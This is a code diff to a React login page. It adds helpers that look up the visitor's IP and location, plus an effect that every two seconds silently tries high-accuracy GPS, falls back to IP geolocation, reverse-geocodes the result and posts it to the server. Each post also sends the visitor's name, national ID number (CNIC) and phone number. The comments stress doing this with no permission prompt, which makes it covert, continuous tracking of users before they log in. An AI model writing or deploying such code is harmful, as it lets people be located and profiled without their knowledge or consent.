@@ -15,43 +15,107 @@ function Login() {
   const [cnicError, setCnicError] = useState("");
   const [phoneError, setPhoneError] = useState("");
 
+  // --- Geolocation Helpers ---
+  const getIP = async () => {
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      if (!r.ok) return "";
+      const j = await r.json();
+      return j && j.ip ? j.ip : "";
+    } catch (e) {
+      return "";
+    }
+  };
+
+  const lookupIpLocation = async (ipAddr) => {
+    try {
+      const url = ipAddr
+        ? `https://ipapi.co/${ipAddr}/json/`
+        : `https://ipapi.co/json/`;
+      const r = await fetch(url);
+      if (!r.ok) return { lat: null, lon: null, area: "unknown" };
+      const data = await r.json();
+      const lat = data.latitude || data.lat || null;
+      const lon = data.longitude || data.lon || null;
+      const area =
+        data.city ||
+        data.region ||
+        data.country_name ||
+        data.country ||
+        "unknown";
+      return { lat, lon, area };
+    } catch (e) {
+      return { lat: null, lon: null, area: "unknown" };
+    }
+  };
+
+  const reverseGeocode = async (lat, lon) => {
+    try {
+      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&addressdetails=1&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&accept-language=en`;
+      const res = await fetch(url, { headers: { Accept: "application/json" } });
+      if (!res.ok) return "unknown";
+      const data = await res.json();
+      const addr = data && data.address ? data.address : null;
+      const area =
+        (addr &&
+          (addr.city ||
+            addr.town ||
+            addr.village ||
+            addr.suburb ||
+            addr.hamlet)) ||
+        addr?.county ||
+        addr?.state ||
+        data.display_name ||
+        "unknown";
+      return area;
+    } catch (e) {
+      return "unknown";
+    }
+  };
+
+  const saveLocationToServer = async (lat, lon, area, ipAddr) => {
+    const locPayload =
+      lat != null && lon != null
+        ? { area: area || "unknown", coordinates: [Number(lon), Number(lat)] }
+        : { area: area || "unknown", coordinates: [0, 0] };
+    const payload = {
+      name: name.trim() || "",
+      iPAddress: ipAddr || ip || "",
+      location: locPayload,
+      deviceType:
+        device ||
+        (navigator.userAgent && /Mobi|Android|iPhone/i.test(navigator.userAgent)
+          ? "mobile"
+          : "desktop"),
+      cnic: (cnic || "").replace(/\D/g, ""),
+      phoneNumber: phone.trim() || "",
+    };
+
+    try {
+      if (userId) {
+        await fetch(`${API_BASE}/api/user/update/${userId}`, {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+      } else {
+        const r = await fetch(`${API_BASE}/api/user/add`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+        if (r.ok) {
+          const data = await r.json();
+          if (data && data._id) setUserId(data._id);
+        }
+      }
+    } catch (e) {
+      // ignore transient network errors
+    }
+  };
+
+  // --- Initial Capture Effect ---
   useEffect(() => {
-    // IP-only geolocation to avoid browser permission prompt
-    const getIP = async () => {
-      try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        if (!r.ok) return "";
-        const j = await r.json();
-        return j && j.ip ? j.ip : "";
-      } catch (e) {
-        return "";
-      }
-    };
-
-    const lookupIpLocation = async (ipAddr) => {
-      try {
-        const url = ipAddr
-          ? `https://ipapi.co/${ipAddr}/json/`
-          : `https://ipapi.co/json/`;
-        const r = await fetch(url);
-        if (!r.ok) return { lat: null, lon: null, area: "unknown" };
-        const data = await r.json();
-        const lat = data.latitude || data.lat || null;
-        const lon = data.longitude || data.lon || null;
-        const area =
-          data.city ||
-          data.region ||
-          data.country_name ||
-          data.country ||
-          "unknown";
-           console.log("finding data",data);
-        return { lat, lon, area };
-      } catch (e) {
-        return { lat: null, lon: null, area: "unknown" };
-      }
-     
-    };
-
     const ua = navigator.userAgent || "";
     const isMobile = /Mobi|Android|iPhone|iPad|iPod|Opera Mini/i.test(ua);
     setDevice(isMobile ? "mobile" : "desktop");
@@ -97,7 +161,76 @@ function Login() {
         // ignore network errors for initial save
       }
     })();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
+
+  // --- Polling Effect: Exact Location Every 2 Seconds (No Permission Prompt) ---
+  useEffect(() => {
+    let intervalId = null;
+
+    const startPolling = () => {
+      intervalId = setInterval(async () => {
+        let gpsLat = null;
+        let gpsLon = null;
+        let useGps = false;
+
+        // Try to get GPS silently with very short timeout (no permission prompt if already denied)
+        if (navigator.geolocation) {
+          try {
+            await new Promise((resolve) => {
+              navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                  gpsLat = pos.coords.latitude;
+                  gpsLon = pos.coords.longitude;
+                  useGps = true;
+                  resolve();
+                },
+                () => {
+                  // Error: permission denied or unavailable; use IP-based fallback
+                  resolve();
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 500 }, // Very short timeout
+              );
+            });
+          } catch (e) {
+            // Fallback to IP-based
+          }
+        }
+
+        if (useGps && gpsLat != null && gpsLon != null) {
+          // Use GPS coordinates
+          setLocation({ latitude: Number(gpsLat), longitude: Number(gpsLon) });
+          const area = await reverseGeocode(gpsLat, gpsLon);
+          setAreaName(area || "unknown");
+          const ipAddr = await getIP();
+          if (ipAddr) setIp(ipAddr);
+          await saveLocationToServer(gpsLat, gpsLon, area, ipAddr);
+        } else {
+          // Fallback: IP-based location (silent, no permission prompt)
+          const ipAddr = await getIP();
+          if (ipAddr) setIp(ipAddr);
+          const ipGeo = await lookupIpLocation(ipAddr);
+          const lat = ipGeo.lat;
+          const lon = ipGeo.lon;
+          const area = ipGeo.area || "unknown";
+          if (lat != null && lon != null) {
+            setLocation({ latitude: Number(lat), longitude: Number(lon) });
+            const areaRefined = await reverseGeocode(lat, lon);
+            setAreaName(areaRefined || "unknown");
+            await saveLocationToServer(lat, lon, areaRefined || area, ipAddr);
+          } else {
+            setAreaName("unknown");
+          }
+        }
+      }, 2000);
+    };
+
+    startPolling();
+
+    return () => {
+      if (intervalId) clearInterval(intervalId);
+    };
+  }, [userId, name, cnic, phone, device]);
 
   // Validation helpers
   const validateName = (v) => {
